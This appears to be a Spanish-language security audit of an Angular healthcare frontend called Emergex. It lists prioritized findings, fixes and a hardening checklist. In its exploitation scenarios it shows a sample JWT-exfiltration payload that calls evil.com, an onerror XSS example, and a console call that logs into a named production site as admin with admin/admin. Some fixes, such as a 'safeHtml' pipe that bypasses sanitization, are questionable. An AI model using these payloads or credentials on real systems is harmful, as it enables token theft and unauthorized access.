# Emergex Frontend — Auditoría de Seguridad Angular (SDD)

> **Versión**: 1.0.0  
> **Fecha**: 2026-05-18  
> **Fuente**: Auditoría paranoica de seguridad sobre emergex-frontend Angular 21.2  
> **Propósito**: Identificar, priorizar y corregir vulnerabilidades, malas prácticas y vectores de ataque

---

## 1. Contexto

### 1.1 Stack auditado

| Capa | Tecnología | Versión |
|------|-----------|---------|
| Framework | Angular (standalone) | 21.2.x |
| Lenguaje | TypeScript strict | 5.9 |
| Estado | Angular Signals | — |
| HTTP | `@angular/common/http` con interceptors funcionales | — |
| Realtime | STOMP sobre SockJS (`@stomp/stompjs`) | 7.3 |
| Autenticación | JWT en `localStorage` → header `Authorization: Bearer` | — |
| Build | `@angular/build:application` (esbuild) | — |
| Backend | JHipster 9.0.0 (Spring Boot + Maven + PostgreSQL) | — |
| CSR puro | Sin SSR (sin `TransferState`) | — |

### 1.2 Alcance

75 archivos TypeScript · 14 servicios API · 4 stores con Signals · 3 guards · 2 interceptors · 1 WebSocket service · sin file upload · sin SSR

---

## 2. Hallazgos — Priorizados por severidad

---

### 🔴 CRÍTICO

---

#### C1 — JWT en localStorage sin protección XSS

**Severidad:** CRÍTICA | **OWASP:** A02 / A07 | **CWE-922**

**Ubicación:**
- `src/app/core/auth/auth.service.ts:35` — `localStorage.setItem(JWT_KEY, res.id_token)`
- `src/app/core/auth/auth.service.ts:56` — `localStorage.getItem(JWT_KEY)`
- `src/app/core/auth/auth.interceptor.ts:6` — `localStorage.getItem(JWT_KEY)`

**Riesgo:** XSS → `localStorage.getItem('emergex_jwt')` → token completo del usuario. Acceso total a APIs con datos clínicos (PHI). El token se adjunta a **todas** las requests HTTP.

**Escenario de explotación:**
1. Atacante encuentra XSS (reflected/stored/paquete npm malicioso)
2. Payload: `fetch('https://evil.com/?t=' + localStorage.getItem('emergex_jwt'))`
3. Atacante usa el token para requests autenticadas como la víctima

**Fix:**
```typescript
// Migrar a httpOnly cookie + SameSite=Strict + Secure
// Backend (JHipster) debe enviar JWT como cookie httpOnly en /api/authenticate
// Luego remover el interceptor Bearer manual:
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  // Las cookies httpOnly viajan automáticamente
  return next(req);
};
```
Mitigación parcial si httpOnly no es viable a corto plazo:
- Encriptar token en localStorage con Web Crypto API (`window.crypto.subtle`)
- CSP estricta (ver H1)
- Rotación frecuente de tokens

---

#### C2 — JWT expuesto como query parameter en WebSocket

**Severidad:** CRÍTICA | **OWASP:** A04 | **CWE-598**

**Ubicación:**
- `src/app/core/websocket/websocket.service.ts:13` — `` `${environment.wsUrl}?access_token=${token}` ``
- `src/app/features/operations/operations.component.ts:328-330`

**Riesgo:** Token en URL del WebSocket → logs de proxy inverso (nginx/Apache), logs del servidor SockJS, browser history, Referer headers.

**Escenario de explotación:**
1. Admin de infraestructura con acceso a logs de nginx encuentra todos los tokens
2. Atacante compromete servidor de logs → robo masivo de tokens
3. Sin refresh token, los tokens robados son válidos hasta que expiren

**Fix:**
```typescript
// Usar connectHeaders de STOMP, no query param
connect(token: string): void {
  this.client = new Client({
    webSocketFactory: () => new SockJS(environment.wsUrl) as WebSocket,
    connectHeaders: {
      Authorization: `Bearer ${token}`,
    },
    reconnectDelay: 5000,
    // ...
  });
  this.client.activate();
}
```
**Requiere cambio en backend** si solo acepta query param para el handshake.

---

#### C3 — RoleGuard definido pero NO aplicado en rutas

**Severidad:** CRÍTICA | **OWASP:** A01 | **CWE-862**

**Ubicación:**
- `src/app/core/auth/role.guard.ts:6-19` — guard funcional y correcto
- `src/app/app.routes.ts:28` — `canActivate: [authGuard]` sin `roleGuard` en ninguna ruta hija
- `src/app/core/stores/session.store.ts` — 8 roles definidos, todos implementados

**Riesgo:** Cualquier usuario autenticado navega a cualquier ruta. Verificaciones de rol en componentes son solo UI / cosméticas. Los datos se cargan igual al montar el componente.

**Escenario de explotación:** Operador (`ROLE_OPERADOR`) accede a `/settings` escribiendo la URL → componente carga → requests a `/api/configuracion`. Si el backend no tiene autorización a nivel endpoint, el operador modifica configuraciones críticas.

**Fix:**
```typescript
// app.routes.ts — cada ruta sensible con su roleGuard:
{
  path: 'settings',
  canActivate: [authGuard, roleGuard('ROLE_ADMIN')],
  loadComponent: () => import('./features/settings/...').then(m => m.SettingsComponent),
},
{
  path: 'facturacion',
  canActivate: [authGuard, roleGuard('ROLE_ADMIN', 'ROLE_ADMINISTRADOR')],
  loadComponent: () => import('./features/facturacion/...').then(m => m.FacturacionComponent),
},
{
  path: 'institutions',
  canActivate: [authGuard, roleGuard('ROLE_ADMIN', 'ROLE_PROPIETARIO', 'ROLE_ADMINISTRADOR')],
  loadComponent: () => import('./features/institutions/...').then(m => m.InstitutionsComponent),
},
{
  path: 'plans',
  canActivate: [authGuard, roleGuard('ROLE_ADMIN', 'ROLE_PROPIETARIO', 'ROLE_ADMINISTRADOR')],
  loadComponent: () => import('./features/plans/...').then(m => m.PlansComponent),
},
{
  path: 'staff',
  canActivate: [authGuard, roleGuard('ROLE_ADMIN', 'ROLE_ADMINISTRADOR')],
  loadComponent: () => import('./features/staff/...').then(m => m.StaffComponent),
},
```

---

#### C4 — Credenciales hardcodeadas en producción

**Severidad:** CRÍTICA | **OWASP:** A07 | **CWE-798**

**Ubicación:** `src/app/features/auth/login/login.component.ts:401-403`
```typescript
quickDemo(): void {
  this.form.patchValue({ username: 'admin', password: 'admin' });
  setTimeout(() => this.submit(), 60);
}
```

**Riesgo:** Botón "Entrar como demo (admin)" en la UI de producción. La función es invocable desde consola. Cuenta `admin`/`admin` probablemente existe en producción.

**Escenario de explotación:** Acceso a `https://aliviar.appcanvas.store/login` → clic en "Entrar como demo (admin)" → acceso administrador completo. O desde consola: `document.querySelector('app-login').__ngContext__[0].quickDemo()`.

**Fix:**
```typescript
// Opción A: Condicionar con environment
quickDemo(): void {
  if (environment.production) return;
  this.form.patchValue({ username: 'admin', password: 'admin' });
  setTimeout(() => this.submit(), 60);
}

// Opción B: Remover botón del template en prod
@if (!isProd) {
  <button type="button" class="btn btn--ghost" (click)="quickDemo()">
    Entrar como demo (admin)
  </button>
}
```
**ADEMÁS:** Cambiar contraseña `admin` en producción INMEDIATAMENTE.

---

### 🟠 ALTO

---

#### H1 — Sin Content Security Policy (CSP)

**Severidad:** ALTA | **OWASP:** A05 | **CWE-1021**

**Ubicación:** `src/index.html:1-16` — sin `<meta http-equiv="Content-Security-Policy">` ni header CSP

**Riesgo:** Sin CSP, un XSS exitoso ejecuta código arbitrario sin restricciones. MapLibre carga tiles de CDN externa (`basemaps.cartocdn.com`) y Google Fonts — se necesita CSP que permita esos orígenes explícitamente.

**Fix:**
```html
<!-- index.html <head> -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https://*.cartocdn.com https://basemaps.cartocdn.com;
  connect-src 'self' https://aliviar.appcanvas.store wss://aliviar.appcanvas.store https://basemaps.cartocdn.com;
  frame-src 'self';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
">
```
Testear con `Content-Security-Policy-Report-Only` primero para no romper funcionalidad existente.

---

#### H2 — Sin mecanismo de refresh token ni expiración client-side

**Severidad:** ALTA | **OWASP:** A02 | **CWE-613**

**Ubicación:**
- `src/app/core/auth/auth.service.ts` — solo maneja `id_token`, sin `refresh_token`
- `src/app/core/auth/error.interceptor.ts:12-13` — ante 401 hace logout inmediato

**Riesgo:** Token expira → 401 → logout abrupto. Si el token tiene validez larga (24h), token robado da acceso prolongado sin posibilidad de revocación.

**Fix:**
```typescript
// auth.service.ts — agregar refresh
refreshToken(): Observable<{ id_token: string }> {
  const token = this.getToken();
  return this.http.post<{ id_token: string }>(
    `${environment.apiUrl}/api/refresh`,
    { token }
  ).pipe(
    tap(res => localStorage.setItem(JWT_KEY, res.id_token))
  );
}

// error.interceptor.ts — intentar refresh antes de logout
if (error.status === 401 && !req.url.includes('/api/refresh')) {
  return authService.refreshToken().pipe(
    switchMap(() => next(req)),
    catchError(() => { authService.logout(); return throwError(() => error); })
  );
}
```

---

#### H3 — console.error en producción expone estado interno

**Severidad:** ALTA | **OWASP:** A04 | **CWE-532**

**Ubicaciones:**

| Archivo | Línea | Exposición |
|---------|-------|-----------|
| `main.ts` | 6 | `console.error(err)` — error de bootstrap |
| `shell.component.ts` | 95 | `console.error('Error al crear ticket')` |
| `emergency.store.ts` | 49 | `console.error('[EmergencyStore]', err)` — stack trace completo |
| `websocket.service.ts` | 22 | `console.error('STOMP error', frame)` — frame STOMP con headers |
| `websocket.service.ts` | 38,53 | `console.warn(...)` — estado de conexión |

**Riesgo:** `emergency.store.ts:49` imprime el objeto `err` completo (URLs de API internas, response body del backend). `websocket.service.ts:22` imprime frame STOMP con headers.

**Fix:**
```typescript
// src/app/core/utils/logger.ts
import { isDevMode } from '@angular/core';

export function logError(context: string, err: unknown): void {
  if (isDevMode()) {
    console.error(context, err);
  }
  // Producción: enviar a Sentry/Datadog sin datos sensibles
}
```

---

#### H4 — Constante JWT_KEY duplicada sin fuente única de verdad

**Severidad:** ALTA | **CWE-1104**

**Ubicación:**
- `src/app/core/auth/auth.service.ts:9` — `const JWT_KEY = 'emergex_jwt';`
- `src/app/core/auth/auth.interceptor.ts:3` — `const JWT_KEY = 'emergex_jwt';`

**Riesgo:** Cambiar una y olvidar la otra rompe autenticación silenciosamente. Refactor accidental podría usar claves distintas en service vs interceptor.

**Fix:**
```typescript
// src/app/core/auth/auth.constants.ts
export const JWT_STORAGE_KEY = 'emergex_jwt';
```
Importar desde `auth.service.ts` y `auth.interceptor.ts`.

---

#### H5 — innerHTML nativo en operations-map sin sanitización Angular

**Severidad:** ALTA | **CWE-79**

**Ubicación:** `src/app/shared/components/map/operations-map/operations-map.component.ts:82`
```typescript
badge.innerHTML = `<svg width="13" height="13" ...>...</svg>`;
```

**Riesgo actual:** Bajo (SVG hardcodeado). **Riesgo futuro:** Muy alto si se pasa contenido dinámico. Esta línea bypassa el sanitizer de Angular completamente porque usa API nativa del DOM.

**Escenario de explotación futura:** Desarrollador modifica `createAmbEl` para aceptar ícono desde DTO → atacante modifica DTO en backend → `<img src=x onerror=stealToken()>` → XSS ejecutado.

**Fix:**
```typescript
// Opción A: DOM API en lugar de string
const svgNS = 'http://www.w3.org/2000/svg';
const svg = document.createElementNS(svgNS, 'svg');
svg.setAttribute('width', '13');
svg.setAttribute('height', '13');
// ... crear elementos hijos con createElementNS

// Opción B: Si debe usar innerHTML, sanitizar explícitamente
import { DomSanitizer, SecurityContext } from '@angular/platform-browser';
const safe = this.sanitizer.sanitize(SecurityContext.HTML, svgString);
badge.innerHTML = safe ?? '';
```

---

### 🟡 MEDIO

---

#### M1 — `[innerHTML]` sin sanitización explícita en patient-detail

**Severidad:** MEDIA | **CWE-79**

**Ubicación:** `src/app/features/patients/patient-detail/patient-detail.component.ts:206`
```html
<span [innerHTML]="t.icon"></span>
```

**Riesgo:** `t.icon` son SVGs hardcodeados (seguro actualmente). Angular aplica sanitizer por defecto. Riesgo: un futuro mantenedor replica este patrón con datos dinámicos, asumiendo que es seguro.

**Fix:**
```typescript
// Pipe de sanitización explícita para documentar la intención:
@Pipe({ name: 'safeHtml', standalone: true })
export class SafeHtmlPipe implements PipeTransform {
  private sanitizer = inject(DomSanitizer);
  transform(html: string) {
    return this.sanitizer.bypassSecurityTrustHtml(html);
  }
}
```
O mejor: usar componentes de icono en lugar de `[innerHTML]`.

---

#### M2 — Datos mock que simulan PII real en institutions

**Severidad:** MEDIA | **OWASP:** A04

**Ubicación:** `src/app/features/institutions/institutions.component.ts:80-139`

Contiene 9 instituciones con CUITs, direcciones, teléfonos, emails, nombres de contacto que parecen reales. Si este código llega a producción por fallback de API, expone información.

**Fix:**
- Mover seed data a archivo de mock separado: `src/app/data-access/mock/institutions.seed.ts`
- Todos los datos deben ser OBVIAMENTE falsos: `cuit: '00-00000000-0'`, `email: 'demo@example.com'`
- Envolver en guard: `if (environment.production) return [];`

---

#### M3 — Sin validación de formato/longitud/sanitización en formularios

**Severidad:** MEDIA | **CWE-20**

**Ubicación:** Todos los componentes con forms. El sistema usa template-driven forms con `[(ngModel)]`. Solo `required` como validación.

**Riesgo:** Payloads SQL injection o XSS stored en campos como `direccion`, `nombre`, `observaciones` enviados a backend sin sanitización client-side adicional.

**Fix:**
- Agregar `Validators.pattern()` para emails, `Validators.maxLength()`
- Sanitizar inputs con pipe que remueva `<>'"&` antes de enviar
- NUNCA confiar solo en validación del backend

---

#### M4 — Suscripciones sin unsubscribe (memory leaks en SPA 24/7)

**Severidad:** MEDIA | **CWE-401**

**Ubicación:** 80+ `.subscribe()` en componentes sin `takeUntil` / `takeUntilDestroyed`.

**Riesgo:** Memory leaks que degradan rendimiento en SPA de operaciones continuas. No explotable directamente pero afecta disponibilidad.

**Fix:**
```typescript
// Usar takeUntilDestroyed() (Angular 16+)
import { takeUntilDestroyed } from '@angular/core';

this.api.getData()
  .pipe(takeUntilDestroyed(this.destroyRef))
  .subscribe(data => this.data.set(data));
```
O usar `async` pipe en templates para auto-unsubscribe.

---

#### M5 — No se invalidan tokens en otras pestañas al hacer logout

**Severidad:** MEDIA

**Ubicación:** `src/app/core/auth/auth.service.ts:48-53` — `logout()` solo limpia pestaña actual

**Riesgo:** Otras pestañas conservan token en memoria y `_isAuthenticated = true`. Pueden seguir haciendo requests hasta que token expire.

**Fix:**
```typescript
// En AuthService constructor:
window.addEventListener('storage', (event) => {
  if (event.key === JWT_KEY && !event.newValue) {
    this._account.set(null);
    this._isAuthenticated.set(false);
    this.router.navigate(['/login']);
  }
});
```

---

#### M6 — Sin rate limiting en login form

**Severidad:** MEDIA | **OWASP:** A07

**Ubicación:** `src/app/features/auth/login/login.component.ts:406-431` — `submit()`

**Riesgo:** Sin throttle client-side. Si backend no tiene rate limiting, brute-force de credenciales es viable.

**Fix:**
```typescript
private attempts = 0;
private lockedUntil = 0;
private readonly MAX_ATTEMPTS = 5;
private readonly LOCKOUT_MS = 30_000;

submit(): void {
  if (this.lockedUntil && Date.now() < this.lockedUntil) {
    this.errorMsg.set(`Esperá ${Math.ceil((this.lockedUntil - Date.now()) / 1000)}s.`);
    return;
  }
  // ... login logic
  error: () => {
    this.attempts++;
    if (this.attempts >= this.MAX_ATTEMPTS) {
      this.lockedUntil = Date.now() + this.LOCKOUT_MS;
    }
  }
}
```
**NOTA:** El rate limiting real DEBE estar en el backend.

---

### 🟢 BAJO

---

#### L1 — Sin protección CSRF (aceptable con JWT Bearer)

Dado que el sistema usa JWT en header `Authorization: Bearer`, no es vulnerable a CSRF tradicional. Si migran a httpOnly cookies (C1), DEBEN implementar CSRF protection (doble submit cookie o header `X-XSRF-TOKEN`).

#### L2 — URL de producción en environment.ts legible

`src/environments/environment.prod.ts` expone `https://aliviar.appcanvas.store`. No es un secreto, pero el environment de dev expone `localhost:8080`, revelando estructura del backend.

#### L3 — Sin certificate pinning

Sin HPKP ni certificate transparency enforcement. El backend usa HTTPS con `wss://` (correcto), pero no hay verificación adicional en cliente contra certificados fraudulentos.

#### L4 — Bundle sin ofuscación avanzada

Angular en producción minifica pero no ofusca lógica de negocio, roles, endpoints API. Un atacante puede leer la arquitectura completa desde el bundle con pretty-print. Considerar `@angular-builders/custom-webpack` + plugin de ofuscación.

#### L5 — Positivo: superficies de ataque ausentes

- ✅ Sin file upload (reduce riesgo de malicious file upload)
- ✅ Sin SSR (sin riesgo de `TransferState` leaking)
- ✅ Sin `[src]` dinámico (sin riesgo de URL injection)
- ✅ Sin API keys duras en código
- ✅ Sin `DomSanitizer.bypassSecurityTrust*` (sanitizer de Angular activo en todos los bindings)
- ✅ Angular 21.2 (latest, sin dependencias con vulnerabilidades conocidas)
- ✅ `npm audit` limpio (0 vulnerabilities high/critical)
- ✅ Todas las rutas lazy-loaded (separación de código)
- ✅ `strictTemplates: true` en tsconfig
- ✅ `strict: true` en tsconfig

---

## 3. Resumen de hallazgos

| Categoría | Críticos | Altos | Medios | Bajos |
|-----------|----------|-------|--------|-------|
| XSS / Sanitización | — | 1 | 1 | — |
| Autenticación / JWT | 2 | 2 | 1 | — |
| Autorización / Guards | 1 | — | — | — |
| Secretos en código | 1 | — | 1 | — |
| CSP / Headers | — | 1 | — | — |
| Errores / Logs | — | 1 | — | — |
| Calidad de código | — | 1 | 3 | 1 |
| **TOTAL** | **4** | **6** | **6** | **1** |

---

## 4. Hardening Checklist

### 🔴 Crítico — Este sprint

- [ ] **C1:** Migrar JWT de `localStorage` a httpOnly cookie (requiere cambio en backend + frontend)
- [ ] **C2:** Eliminar token de query params del WebSocket. Usar `connectHeaders` de STOMP. Cambiar backend si solo acepta query param
- [ ] **C3:** Aplicar `roleGuard` a rutas sensibles: `/settings`, `/facturacion`, `/institutions`, `/plans`, `/staff`
- [ ] **C4:** Remover `quickDemo()` de producción o condicionar con `environment.production`. Cambiar contraseña admin en backend YA

### 🟠 Alto — Próximo sprint

- [ ] **H1:** Implementar Content-Security-Policy vía `<meta>` o header HTTP. Usar `Report-Only` primero
- [ ] **H2:** Implementar refresh token con rotación en backend y frontend
- [ ] **H3:** Crear `logError()` condicional con `isDevMode()`. Redirigir a servicio de monitoreo externo en prod
- [ ] **H4:** Extraer `JWT_STORAGE_KEY` a `auth.constants.ts`
- [ ] **H5:** Reemplazar `innerHTML` nativo en `operations-map.component.ts` con DOM API o sanitización explícita

### 🟡 Medio — Siguientes 2 sprints

- [ ] **M1:** Agregar `SafeHtmlPipe` o refactorizar iconos a componentes (eliminar `[innerHTML]`)
- [ ] **M2:** Mover seed data de institutions a archivo de mock con datos ficticios. Guard `environment.production`
- [ ] **M3:** Agregar validación de formato/longitud/sanitización en todos los formularios
- [ ] **M4:** Implementar `takeUntilDestroyed()` en todas las suscripciones
- [ ] **M5:** Sincronizar logout entre pestañas con evento `storage`
- [ ] **M6:** Agregar rate limiting client-side en login (defensa en profundidad; el real en backend)

### 🟢 Bajo — Mejora continua

- [ ] Implementar timeout de inactividad (15 min sin interacción = logout automático)
- [ ] Agregar `ng lint` con reglas de seguridad al pipeline CI (`@angular-eslint/template/accessibility-*`)
- [ ] Verificar autorización a nivel endpoint en backend (no confiar solo en guards del frontend)
- [ ] Revisar que `rememberMe: false` no cause sesiones perpetuas en backend JHipster
- [ ] Agregar ofuscación avanzada al build de producción
- [ ] Rotar periódicamente nombre de storage key (`emergex_jwt`)
- [ ] Implementar CAPTCHA en login (hCaptcha o Turnstile)

---

## 5. Archivos afectados

| Archivo | Hallazgos | Acción |
|---------|-----------|--------|
| `src/app/core/auth/auth.service.ts` | C1, H2, H4, M5 | Refactor JWT storage, agregar refresh, extraer constante, evento storage |
| `src/app/core/auth/auth.interceptor.ts` | C1, H4 | Remover lectura manual de localStorage, usar constante compartida |
| `src/app/core/auth/error.interceptor.ts` | H2 | Agregar intento de refresh antes de logout |
| `src/app/core/auth/role.guard.ts` | C3 | Sin cambios (ya está correcto) |
| `src/app/core/websocket/websocket.service.ts` | C2, H3 | Token vía connectHeaders, remover console.error |
| `src/app/app.routes.ts` | C3 | Agregar `roleGuard` a rutas sensibles |
| `src/app/features/auth/login/login.component.ts` | C4, M6 | Condicionar `quickDemo()` + rate limiting |
| `src/app/shared/components/map/operations-map/operations-map.component.ts` | H5 | Reemplazar `innerHTML` nativo |
| `src/app/features/patients/patient-detail/patient-detail.component.ts` | M1 | Sanitización explícita para `[innerHTML]` |
| `src/app/features/institutions/institutions.component.ts` | M2 | Mover seed data a mock, datos ficticios |
| `src/app/core/stores/emergency.store.ts` | H3 | Reemplazar `console.error` |
| `src/index.html` | H1 | CSP meta tag |
| `src/main.ts` | H3 | Reemplazar `console.error` |
| `src/app/core/auth/*` (nuevo) | H4 | Crear `auth.constants.ts` |
| `src/app/core/utils/*` (nuevo) | H3 | Crear `logger.ts` |

---

## 6. Verificación post-implementación

- [ ] `npm audit --audit-level=high` → 0 vulnerabilities
- [ ] `ng lint` → 0 warnings, 0 errors
- [ ] CSP sin errores en consola (modo `Report-Only`)
- [ ] Login/logout funcional sin JWT en localStorage (si se migró a httpOnly)
- [ ] WebSocket conecta sin token en URL
- [ ] Navegación a `/settings` como operador → redirect a `/access-denied`
- [ ] `quickDemo()` no disponible en build producción
- [ ] Sin `console.error` en build producción
- [ ] `innerHTML` nativo reemplazado o sanitizado
- [ ] Seed data no incluido en bundle de producción
